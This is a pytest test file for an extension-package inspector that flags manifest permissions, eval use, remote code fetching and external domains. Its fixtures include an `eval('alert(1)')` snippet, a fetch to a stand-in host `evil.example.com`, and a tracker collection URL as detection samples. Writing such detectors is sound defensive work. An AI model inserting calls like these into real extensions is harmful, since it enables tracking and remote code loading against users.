import io
import json
import zipfile

import pytest

from app.inspector import InspectorError, inspect_package


def make_zip(files: dict[str, str | bytes]) -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        for name, content in files.items():
            if isinstance(content, str):
                content = content.encode()
            zf.writestr(name, content)
    return buf.getvalue()


def test_basic_manifest_permissions():
    data = make_zip({
        "manifest.json": json.dumps({
            "manifest_version": 3,
            "name": "Test",
            "version": "1.0",
            "permissions": ["storage", "tabs"],
            "host_permissions": ["<all_urls>"],
        }),
        "background.js": "console.log('ok');",
    })
    result = inspect_package(data)
    assert "storage" in result.permissions
    assert "tabs" in result.permissions
    assert "<all_urls>" in result.host_permissions
    assert result.manifest_version == 3


def test_eval_detection():
    data = make_zip({
        "manifest.json": json.dumps({"manifest_version": 2, "name": "x", "version": "1"}),
        "content.js": "eval('alert(1)'); doSomething();",
    })
    result = inspect_package(data)
    assert result.uses_eval is True


def test_new_function_detection():
    data = make_zip({
        "manifest.json": json.dumps({"manifest_version": 2, "name": "x", "version": "1"}),
        "bg.js": "var f = new Function('return 1');",
    })
    result = inspect_package(data)
    assert result.uses_eval is True


def test_remote_code_detection():
    data = make_zip({
        "manifest.json": json.dumps({"manifest_version": 2, "name": "x", "version": "1"}),
        "bg.js": "fetch('https://evil.example.com/data').then(r => r.json());",
    })
    result = inspect_package(data)
    assert result.uses_remote_code is True


def test_external_domain_extracted():
    data = make_zip({
        "manifest.json": json.dumps({"manifest_version": 2, "name": "x", "version": "1"}),
        "bg.js": "var url = 'https://tracker.badactor.io/collect';",
    })
    result = inspect_package(data)
    assert any("badactor.io" in d for d in result.external_domains)


def test_safe_domains_not_flagged():
    data = make_zip({
        "manifest.json": json.dumps({"manifest_version": 2, "name": "x", "version": "1"}),
        "bg.js": "fetch('https://fonts.googleapis.com/css?family=Roboto');",
    })
    result = inspect_package(data)
    assert result.external_domains == []


def test_no_eval_clean_code():
    data = make_zip({
        "manifest.json": json.dumps({"manifest_version": 2, "name": "x", "version": "1"}),
        "bg.js": "function greet(name) { return 'Hello ' + name; }",
    })
    result = inspect_package(data)
    assert result.uses_eval is False
    assert result.uses_remote_code is False


def test_file_count():
    data = make_zip({
        "manifest.json": json.dumps({"manifest_version": 2, "name": "x", "version": "1"}),
        "bg.js": "",
        "content.js": "",
        "popup.html": "",
    })
    result = inspect_package(data)
    assert result.file_count == 4


def test_invalid_zip_raises():
    with pytest.raises(InspectorError):
        inspect_package(b"not a zip file at all")


def test_crx_header_stripped():
    """Simulate a CRX with a fake header before the zip magic."""
    zip_bytes = make_zip({
        "manifest.json": json.dumps({"manifest_version": 3, "name": "T", "version": "1"}),
    })
    # Prepend fake CRX3 header bytes
    fake_header = b"Cr24" + b"\x00" * 12
    crx_data = fake_header + zip_bytes
    # The inspector doesn't strip headers — the fetcher does.
    # Feed raw zip directly (after stripping) to inspector:
    result = inspect_package(zip_bytes)
    assert result.manifest_version == 3


def test_vscode_package_json():
    data = make_zip({
        "extension/package.json": json.dumps({
            "name": "my-ext",
            "version": "0.5.0",
            "contributes": {"commands": []},
        }),
        "extension/background.js": "console.log('vscode');",
    })
    result = inspect_package(data)
    # VS Code extensions don't have Chrome-style permissions
    assert result.permissions == []
